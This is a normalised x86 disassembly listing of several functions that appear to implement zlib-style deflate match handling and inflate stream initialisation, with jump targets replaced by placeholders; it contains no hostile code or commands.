mov edx [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
mov ecx [ edx + 0x5e ]
mov edx [ esp + 0x4 ]
sub ecx [ eax + 0x4e ]
cmp [ edx + 0x4e ] 0x0
jl r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x5e ]
mov edx [ esp ]
sub ecx [ eax + 0x4e ]
mov eax [ edx + 0x1e ]
sub eax 0x106
cmp ecx eax
jb r-xdata
cmp [ esp + 0x4 ] 0x4
sete dl
and edx 0x1
push edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
mov ecx [ ecx + 0x5e ]
sub ecx [ eax + 0x4e ]
cmp [ edx + 0x4e ] 0x0
jl r-xdata
xor eax eax
pop ecx
pop edx
retn
xor edx edx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x2a ]
mov eax [ esp + 0x4 ]
add edx [ eax + 0x4e ]
jmp r-xdata
xor edx edx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x2a ]
mov eax [ esp + 0x4 ]
add edx [ eax + 0x4e ]
jmp r-xdata
xor eax eax
pop ecx
pop edx
retn
mov eax [ esp + 0x4 ]
call sub_4676a4
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x5e ]
mov [ eax + 0x4e ] ecx
mov edx [ esp ]
mov eax [ edx ]
call sub_462dc0
mov edx [ esp ]
mov ecx [ edx ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
cmp [ esp + 0x4 ] 0x4
mov eax 0x3
je r-xdata
cmp [ esp + 0x4 ] 0x4
mov eax 0x2
je r-xdata
mov eax [ esp + 0x4 ]
call sub_4676a4
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x5e ]
mov [ eax + 0x4e ] ecx
mov edx [ esp ]
mov eax [ edx ]
call sub_462dc0
mov edx [ esp ]
mov ecx [ edx ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
pop ecx
pop edx
retn
add eax 0xfffffffe
add eax 0xfffffffe
pop ecx
pop edx
retn
sub_463acc
add esp 0xfffffff0
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov ecx [ esp ]
cmp [ ecx + 0x66 ] 0x3
jb r-xdata
mov eax [ esp ]
call sub_463744
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x106
jae r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp ]
mov ecx [ eax + 0x4a ]
mov eax [ edx + 0x3a ]
shl eax cl
mov edx [ esp ]
mov ecx [ edx + 0x2a ]
mov edx [ esp ]
mov edx [ edx + 0x5e ]
movzx ecx [ ecx + edx + 0x2 ]
mov edx [ esp ]
xor eax ecx
mov ecx [ esp ]
and eax [ edx + 0x46 ]
mov [ ecx + 0x3a ] eax
mov eax [ esp ]
mov edx [ esp ]
mov ecx [ edx + 0x3a ]
mov eax [ eax + 0x36 ]
movzx eax [ eax + ecx * 2 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x5e ]
mov edx [ esp ]
and ecx [ edx + 0x26 ]
mov edx [ esp ]
mov edx [ edx + 0x32 ]
mov [ edx + ecx * 2 ] ax
mov eax [ esp ]
mov ecx [ eax + 0x36 ]
mov eax [ esp ]
mov edx [ eax + 0x3a ]
mov eax [ esp ]
mov ax [ eax + 0x5e ]
mov [ ecx + edx * 2 ] ax
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x52 ] 0x3
jb r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x5e ]
mov edx [ eax + 0x1e ]
sub ecx [ esp + 0x8 ]
sub edx 0x106
cmp ecx edx
ja r-xdata
cmp [ esp + 0x4 ] 0x4
sete dl
and edx 0x1
push edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
mov ecx [ ecx + 0x5e ]
sub ecx [ eax + 0x4e ]
cmp [ edx + 0x4e ] 0x0
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp ]
mov eax [ edx + 0x2a ]
mov edx [ esp ]
mov ecx [ edx + 0x5e ]
xor edx edx
movzx ecx [ eax + ecx ]
mov eax [ esp ]
call sub_4679e4
mov [ esp + 0xc ] eax
mov eax [ esp ]
dec [ eax + 0x66 ]
mov edx [ esp ]
inc [ edx + 0x5e ]
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x52 ]
mov edx [ eax + 0x5e ]
mov eax [ esp ]
sub ecx 0x3
sub edx [ eax + 0x62 ]
mov eax [ esp ]
call sub_4679e4
mov [ esp + 0xc ] eax
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x52 ]
sub [ eax + 0x66 ] ecx
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x52 ]
cmp ecx [ eax + 0x72 ]
ja r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x7a ] 0x2
je r-xdata
xor edx edx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x2a ]
mov eax [ esp + 0x4 ]
add edx [ eax + 0x4e ]
jmp r-xdata
add esp 0x10
retn
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x106
jae r-xdata
push 0x0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
mov ecx [ ecx + 0x5e ]
sub ecx [ eax + 0x4e ]
cmp [ edx + 0x4e ] 0x0
jl r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x52 ]
add [ ecx + 0x5e ] edx
xor edx edx
mov eax [ esp ]
mov [ eax + 0x52 ] edx
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x2a ]
mov ecx [ edx + 0x5e ]
mov edx [ esp ]
movzx eax [ eax + ecx ]
mov [ edx + 0x3a ] eax
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x3a ]
mov ecx [ ecx + 0x4a ]
shl edx cl
mov eax [ esp ]
mov ecx [ eax + 0x2a ]
mov eax [ esp ]
mov eax [ eax + 0x5e ]
movzx ecx [ ecx + eax + 0x1 ]
mov eax [ esp ]
xor edx ecx
mov ecx [ esp ]
and edx [ eax + 0x46 ]
mov [ ecx + 0x3a ] edx
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x3
jb r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_463490
mov ecx [ esp ]
mov [ ecx + 0x52 ] eax
cmp [ esp + 0x4 ] 0x4
mov eax 0x3
je r-xdata
cmp [ esp + 0x4 ] 0x4
mov eax 0x2
je r-xdata
mov eax [ esp + 0x4 ]
call sub_4676a4
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x5e ]
mov [ eax + 0x4e ] ecx
mov edx [ esp ]
mov eax [ edx ]
call sub_462dc0
mov edx [ esp ]
mov ecx [ edx ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
xor edx edx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x2a ]
mov eax [ esp + 0x4 ]
add edx [ eax + 0x4e ]
jmp r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp ]
dec [ ecx + 0x52 ]
add eax 0xfffffffe
add eax 0xfffffffe
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x4 ]
call sub_4676a4
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x5e ]
mov [ eax + 0x4e ] ecx
mov edx [ esp ]
mov eax [ edx ]
call sub_462dc0
mov edx [ esp ]
mov ecx [ edx ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov eax [ esp ]
inc [ eax + 0x5e ]
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x4a ]
mov edx [ eax + 0x3a ]
shl edx cl
mov ecx [ esp ]
mov eax [ ecx + 0x2a ]
mov ecx [ esp ]
mov ecx [ ecx + 0x5e ]
movzx eax [ eax + ecx + 0x2 ]
xor edx eax
mov eax [ esp ]
mov ecx [ esp ]
and edx [ eax + 0x46 ]
mov [ ecx + 0x3a ] edx
mov edx [ esp ]
mov eax [ edx + 0x36 ]
mov edx [ esp ]
mov ecx [ edx + 0x3a ]
movzx eax [ eax + ecx * 2 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x5e ]
mov edx [ esp ]
and ecx [ edx + 0x26 ]
mov edx [ esp ]
mov edx [ edx + 0x32 ]
mov [ edx + ecx * 2 ] ax
mov eax [ esp ]
mov ecx [ eax + 0x36 ]
mov eax [ esp ]
mov edx [ eax + 0x3a ]
mov eax [ esp ]
mov ax [ eax + 0x5e ]
mov [ ecx + edx * 2 ] ax
mov edx [ esp ]
dec [ edx + 0x52 ]
jne r-xdata
mov ecx [ esp ]
inc [ ecx + 0x5e ]
jmp r-xdata
sub_463e24
add esp 0xffffffec
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov ecx [ esp ]
cmp [ ecx + 0x66 ] 0x3
jb r-xdata
mov eax [ esp ]
call sub_463744
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x106
jae r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x52 ]
mov [ eax + 0x6a ] ecx
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x62 ]
mov [ eax + 0x56 ] ecx
mov edx [ esp ]
mov [ edx + 0x52 ] 0x2
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp ]
mov ecx [ eax + 0x4a ]
mov eax [ edx + 0x3a ]
shl eax cl
mov edx [ esp ]
mov ecx [ edx + 0x2a ]
mov edx [ esp ]
mov edx [ edx + 0x5e ]
movzx ecx [ ecx + edx + 0x2 ]
mov edx [ esp ]
xor eax ecx
mov ecx [ esp ]
and eax [ edx + 0x46 ]
mov [ ecx + 0x3a ] eax
mov eax [ esp ]
mov edx [ esp ]
mov ecx [ edx + 0x3a ]
mov eax [ eax + 0x36 ]
movzx eax [ eax + ecx * 2 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x5e ]
mov edx [ esp ]
and ecx [ edx + 0x26 ]
mov edx [ esp ]
mov edx [ edx + 0x32 ]
mov [ edx + ecx * 2 ] ax
mov eax [ esp ]
mov ecx [ eax + 0x36 ]
mov eax [ esp ]
mov edx [ eax + 0x3a ]
mov eax [ esp ]
mov ax [ eax + 0x5e ]
mov [ ecx + edx * 2 ] ax
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x6a ] 0x3
jb r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x6a ]
cmp eax [ edx + 0x72 ]
jae r-xdata
mov edx [ esp ]
cmp [ edx + 0x5a ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x5a ] 0x0
je r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x6a ]
cmp ecx [ eax + 0x52 ]
jb r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x5e ]
mov ecx [ edx + 0x1e ]
sub eax [ esp + 0x8 ]
sub ecx 0x106
cmp eax ecx
ja r-xdata
cmp [ esp + 0x4 ] 0x4
sete cl
and ecx 0x1
push ecx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x5e ]
mov eax [ esp + 0x4 ]
sub ecx [ edx + 0x4e ]
cmp [ eax + 0x4e ] 0x0
jl r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x2a ]
mov ecx [ edx + 0x5e ]
xor edx edx
movzx ecx [ eax + ecx - 0x1 ]
mov eax [ esp ]
call sub_4679e4
mov eax [ esp ]
xor edx edx
mov [ eax + 0x5a ] edx
add esp 0x14
retn
mov edx [ esp ]
mov [ edx + 0x5a ] 0x1
mov ecx [ esp ]
inc [ ecx + 0x5e ]
mov eax [ esp ]
dec [ eax + 0x66 ]
jmp r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x2a ]
mov ecx [ edx + 0x5e ]
xor edx edx
movzx ecx [ eax + ecx - 0x1 ]
mov eax [ esp ]
call sub_4679e4
test eax eax
je r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x5e ]
add ecx [ eax + 0x66 ]
sub ecx 0x3
mov [ esp + 0x10 ] ecx
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x6a ]
mov edx [ eax + 0x5e ]
mov eax [ esp ]
sub ecx 0x3
dec edx
sub edx [ eax + 0x56 ]
mov eax [ esp ]
call sub_4679e4
mov [ esp + 0xc ] eax
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x6a ]
dec ecx
sub [ eax + 0x66 ] ecx
mov edx [ esp ]
sub [ edx + 0x6a ] 0x2
mov eax [ esp ]
cmp [ eax + 0x7a ] 0x2
je r-xdata
xor edx edx
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
mov edx [ edx + 0x2a ]
add edx [ eax + 0x4e ]
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x66 ] 0x106
jae r-xdata
mov edx [ esp ]
inc [ edx + 0x5e ]
mov ecx [ esp ]
dec [ ecx + 0x66 ]
mov eax [ esp ]
mov edx [ eax ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
push 0x0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x5e ]
mov eax [ esp + 0x4 ]
sub ecx [ edx + 0x4e ]
cmp [ eax + 0x4e ] 0x0
jl r-xdata
mov edx [ esp ]
dec [ edx + 0x6a ]
jne r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x4a ]
mov edx [ eax + 0x3a ]
shl edx cl
mov ecx [ esp ]
mov eax [ ecx + 0x2a ]
mov ecx [ esp ]
mov ecx [ ecx + 0x5e ]
movzx eax [ eax + ecx + 0x2 ]
xor edx eax
mov eax [ esp ]
mov ecx [ esp ]
and edx [ eax + 0x46 ]
mov [ ecx + 0x3a ] edx
mov edx [ esp ]
mov eax [ edx + 0x36 ]
mov edx [ esp ]
mov ecx [ edx + 0x3a ]
movzx eax [ eax + ecx * 2 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x5e ]
mov edx [ esp ]
and ecx [ edx + 0x26 ]
mov edx [ esp ]
mov edx [ edx + 0x32 ]
mov [ edx + ecx * 2 ] ax
mov eax [ esp ]
mov ecx [ eax + 0x36 ]
mov eax [ esp ]
mov edx [ eax + 0x3a ]
mov eax [ esp ]
mov ax [ eax + 0x5e ]
mov [ ecx + edx * 2 ] ax
mov ecx [ esp ]
cmp [ ecx + 0x52 ] 0x5
ja r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_463490
mov edx [ esp ]
mov [ edx + 0x52 ] eax
cmp [ esp + 0x4 ] 0x4
mov eax 0x3
je r-xdata
cmp [ esp + 0x4 ] 0x4
mov eax 0x2
je r-xdata
mov eax [ esp + 0x4 ]
call sub_4676a4
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x5e ]
mov [ edx + 0x4e ] eax
mov ecx [ esp ]
mov eax [ ecx ]
call sub_462dc0
mov edx [ esp ]
mov ecx [ edx ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
mov edx [ edx + 0x2a ]
add edx [ eax + 0x4e ]
jmp r-xdata
mov ecx [ esp ]
inc [ ecx + 0x5e ]
mov eax [ ecx + 0x5e ]
cmp eax [ esp + 0x10 ]
ja r-xdata
mov ecx [ esp ]
xor eax eax
mov [ ecx + 0x5a ] eax
mov edx [ esp ]
mov [ edx + 0x52 ] 0x2
mov ecx [ esp ]
inc [ ecx + 0x5e ]
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
cmp [ eax + 0x7a ] 0x1
je r-xdata
add eax 0xfffffffe
add eax 0xfffffffe
jmp r-xdata
mov eax [ esp + 0x4 ]
call sub_4676a4
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x5e ]
mov [ edx + 0x4e ] eax
mov ecx [ esp ]
mov eax [ ecx ]
call sub_462dc0
push 0x0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x5e ]
mov eax [ esp + 0x4 ]
sub ecx [ edx + 0x4e ]
cmp [ eax + 0x4e ] 0x0
jl r-xdata
mov ecx [ esp ]
mov [ ecx + 0x52 ] 0x2
mov edx [ esp ]
cmp [ edx + 0x52 ] 0x3
jne r-xdata
xor edx edx
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
mov edx [ edx + 0x2a ]
add edx [ eax + 0x4e ]
jmp r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x5e ]
sub eax [ edx + 0x62 ]
cmp eax 0x1000
jbe r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x4 ]
call sub_4676a4
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x5e ]
mov [ edx + 0x4e ] eax
mov ecx [ esp ]
mov eax [ ecx ]
call sub_462dc0
mov edx [ esp ]
mov ecx [ edx ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
sub_464268
add esp 0xfffffff8
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
pop ecx
pop edx
retn
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov edx [ esp ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
mov eax [ esp ]
mov [ eax + 0x8 ] ecx
mov edx [ esp ]
xor eax eax
mov [ edx + 0x18 ] eax
mov edx 0x7
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
lea ecx [ esp + 0x4 ]
mov [ eax ] edx
mov edx [ esp ]
mov eax [ edx + 0x1c ]
mov edx [ esp ]
mov eax [ eax + 0x14 ]
call sub_468778
xor eax eax
pop ecx
pop edx
retn
add edx 0xfffffff9
sub_4642d4
add esp 0xfffffff8
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
pop ecx
pop edx
retn
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ esp ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov ecx [ esp ]
mov eax [ esp ]
mov edx [ ecx + 0x1c ]
mov ecx [ esp ]
mov eax [ eax + 0x28 ]
call [ ecx + 0x24 ]
mov edx [ esp ]
xor eax eax
mov [ edx + 0x1c ] eax
xor eax eax
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov eax [ edx + 0x14 ]
mov edx [ esp ]
call sub_469ba8
sub_46433c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov eax [ ebp - 0xc ]
mov dl [ eax ]
cmp dl [ rw-data ]
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x38
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ edx + 0x18 ] ecx
mov ecx 0x18
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
mov edx 0x1
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov edx [ ebp - 0x4 ]
test eax eax
mov [ edx + 0x1c ] eax
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x1c ]
xor eax eax
mov [ ecx + 0x14 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x1c ]
xor eax eax
mov [ ecx + 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax 0xfffffffc
jmp r-xdata
cmp [ ebp - 0x8 ] 0x8
jl r-xdata
neg [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x1c ]
mov [ ecx + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4642d4
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x8 ] 0xf
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x1c ]
mov edx 0x1
mov [ ecx + 0x10 ] eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
shl edx cl
mov ecx edx
mov edx [ eax + 0x1c ]
cmp [ edx + 0xc ] 0x0
je r-xdata
mov edx sub_468540
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_464268
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4642d4
mov eax 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_468848
mov ecx [ ebp - 0x4 ]
test eax eax
mov edx [ ecx + 0x1c ]
mov [ edx + 0x14 ] eax
jne r-xdata
sub_464488
add esp 0xfffffff0
mov [ esp + 0x4 ] edx
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
add esp 0x10
retn
mov edx [ esp ]
cmp [ edx ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jge r-xdata
mov [ esp + 0x8 ] 0xfffffffb
mov eax 0xfffffffe
jmp [ eax * 4 + jump_table_4644da ]
mov edx [ esp ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov edx [ esp ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0xd
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
xor eax eax
mov [ ecx + 0x4 ] eax
mov eax 0xfffffffe
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov eax [ ecx + 0x14 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp ]
call sub_4688f0
mov [ esp + 0x8 ] eax
cmp [ esp + 0x8 ] 0xfffffffd
jne r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0xfffffffd
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
mov al [ ecx ]
xor edx edx
mov dl al
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov [ eax + 0x4 ] edx
and edx 0xf
cmp edx 0x8
je r-xdata
mov eax [ esp + 0x8 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov dl al
mov [ esp + 0xc ] edx
xor edx edx
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov ecx 0x1f
mov eax [ eax + 0x4 ]
shl eax 0x8
add eax [ esp + 0xc ]
div ecx
test edx edx
je r-xdata
mov eax [ esp + 0x8 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov ecx [ esp ]
mov dl al
shl edx 0x18
mov eax [ ecx + 0x1c ]
mov [ eax + 0x8 ] edx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0x3
mov eax [ esp + 0x8 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov ecx [ esp ]
mov dl al
shl edx 0x10
mov eax [ ecx + 0x1c ]
add [ eax + 0x8 ] edx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0x4
mov eax [ esp + 0x8 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov ecx [ esp ]
mov dl al
shl edx 0x8
mov eax [ ecx + 0x1c ]
add [ eax + 0x8 ] edx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0x5
mov eax [ esp + 0x8 ]
jmp r-xdata
mov edx [ esp ]
dec [ edx + 0x4 ]
mov ecx [ esp ]
inc [ ecx + 0x8 ]
mov eax [ esp ]
mov edx [ eax ]
inc [ eax ]
xor eax eax
mov cl [ edx ]
mov edx [ esp ]
mov al cl
mov ecx [ edx + 0x1c ]
add [ ecx + 0x8 ] eax
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov eax [ esp ]
mov ecx [ edx + 0x8 ]
mov [ eax + 0x30 ] ecx
mov eax 0x2
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0x6
jmp r-xdata
mov eax [ esp + 0x8 ]
jmp r-xdata
cmp [ esp + 0x8 ] 0x1
je r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx ] 0xd
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov ecx [ esp ]
mov dl al
shl edx 0x18
mov eax [ ecx + 0x1c ]
mov [ eax + 0x8 ] edx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0x9
mov eax [ esp + 0x8 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov ecx [ esp ]
mov dl al
shl edx 0x10
mov eax [ ecx + 0x1c ]
add [ eax + 0x8 ] edx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0xa
mov eax [ esp + 0x8 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov ecx [ esp ]
mov dl al
shl edx 0x8
mov eax [ ecx + 0x1c ]
add [ eax + 0x8 ] edx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0xb
mov eax [ esp + 0x8 ]
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
dec [ ecx + 0x4 ]
mov eax [ esp ]
inc [ eax + 0x8 ]
mov edx [ esp ]
mov ecx [ edx ]
inc [ edx ]
xor edx edx
mov al [ ecx ]
mov ecx [ esp ]
mov dl al
mov eax [ ecx + 0x1c ]
add [ eax + 0x8 ] edx
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov edx [ esp ]
mov eax [ ecx + 0x4 ]
mov ecx [ edx + 0x1c ]
cmp eax [ ecx + 0x8 ]
je r-xdata
mov eax [ esp + 0x8 ]
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov edx [ esp ]
mov eax [ ecx + 0x4 ]
mov ecx [ edx + 0x1c ]
shr eax 0x4
add eax 0x8
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov ecx [ esp ]
